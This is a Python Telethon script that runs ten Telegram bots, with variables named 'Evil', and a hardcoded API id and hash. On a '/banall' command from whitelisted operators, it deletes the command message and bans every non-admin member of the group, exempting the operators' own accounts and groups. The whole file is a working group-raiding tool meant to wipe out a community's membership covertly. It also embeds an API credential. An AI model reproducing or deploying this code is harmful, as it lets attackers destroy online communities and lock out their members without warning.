import logging
from decouple import config
from os import getenv
from telethon import TelegramClient, events
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import (
    ChannelParticipantsAdmins,
    ChatBannedRights,
)

BOT_TOKEN1 = config("BOT_TOKEN1", None)
BOT_TOKEN2 = config("BOT_TOKEN2", None)
BOT_TOKEN3 = config("BOT_TOKEN3", None)
BOT_TOKEN4 = config("BOT_TOKEN4", None)
BOT_TOKEN5 = config("BOT_TOKEN5", None)
BOT_TOKEN6 = config("BOT_TOKEN6", None)
BOT_TOKEN7 = config("BOT_TOKEN7", None)
BOT_TOKEN8 = config("BOT_TOKEN8", None)
BOT_TOKEN9 = config("BOT_TOKEN9", None)
BOT_TOKEN10 = config("BOT_TOKEN10", None)
SUDO_USERS = list(map(int, getenv("SUDO").split()))
EVILS = [1827586893, 1953656325, 5797689958, 5547355973, 5345918225]
ALTRONS = [-1001777776331, -1001802248291, -1001443562643]
SUDO_USERS.append(1827586893)

RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

logging.basicConfig(level=logging.INFO)
Evil1 = TelegramClient('EVIL1', 18136872, "312d861b78efcd1b02183b2ab52a83a4").start(bot_token=BOT_TOKEN1)
Evil2 = TelegramClient('EVIL2', 18136872, "312d861b78efcd1b02183b2ab52a83a4").start(bot_token=BOT_TOKEN2)
Evil3 = TelegramClient('EVIL3', 18136872, "312d861b78efcd1b02183b2ab52a83a4").start(bot_token=BOT_TOKEN3)
Evil4 = TelegramClient('EVIL4', 18136872, "312d861b78efcd1b02183b2ab52a83a4").start(bot_token=BOT_TOKEN4)
Evil5 = TelegramClient('EVIL5', 18136872, "312d861b78efcd1b02183b2ab52a83a4").start(bot_token=BOT_TOKEN5)
Evil6 = TelegramClient('EVIL6', 18136872, "312d861b78efcd1b02183b2ab52a83a4").start(bot_token=BOT_TOKEN6)
Evil7 = TelegramClient('EVIL7', 18136872, "312d861b78efcd1b02183b2ab52a83a4").start(bot_token=BOT_TOKEN7)
Evil8 = TelegramClient('EVIL8', 18136872, "312d861b78efcd1b02183b2ab52a83a4").start(bot_token=BOT_TOKEN8)
Evil9 = TelegramClient('EVIL9', 18136872, "312d861b78efcd1b02183b2ab52a83a4").start(bot_token=BOT_TOKEN9)
Evil10 = TelegramClient('EVIL10', 18136872, "312d861b78efcd1b02183b2ab52a83a4").start(bot_token=BOT_TOKEN10)


@Evil1.on(events.NewMessage(pattern="^/banall"))
@Evil2.on(events.NewMessage(pattern="^/banall"))
@Evil3.on(events.NewMessage(pattern="^/banall"))
@Evil4.on(events.NewMessage(pattern="^/banall"))
@Evil5.on(events.NewMessage(pattern="^/banall"))
@Evil6.on(events.NewMessage(pattern="^/banall"))
@Evil7.on(events.NewMessage(pattern="^/banall"))
@Evil8.on(events.NewMessage(pattern="^/banall"))
@Evil9.on(events.NewMessage(pattern="^/banall"))
@Evil10.on(events.NewMessage(pattern="^/banall"))
async def banall(event):
   if event.sender_id in SUDO_USERS:
        await event.delete()
        admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
        admins_id = [i.id for i in admins]
        all = 0
        bann = 0
        if int(event.chat_id) in ALTRONS:
            return
        async for user in event.client.iter_participants(event.chat_id):
            all += 1
            try:
                if user.id not in admins_id and user.id not in EVILS:
                    await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
                    bann += 1
            except Exception as e:
                pass


print("TEAM LEGENDZ OP")

Evil1.run_until_disconnected()
Evil2.run_until_disconnected()
Evil3.run_until_disconnected()
Evil4.run_until_disconnected()
Evil5.run_until_disconnected()
Evil6.run_until_disconnected()
Evil7.run_until_disconnected()
Evil8.run_until_disconnected()
Evil9.run_until_disconnected()
Evil10.run_until_disconnected()
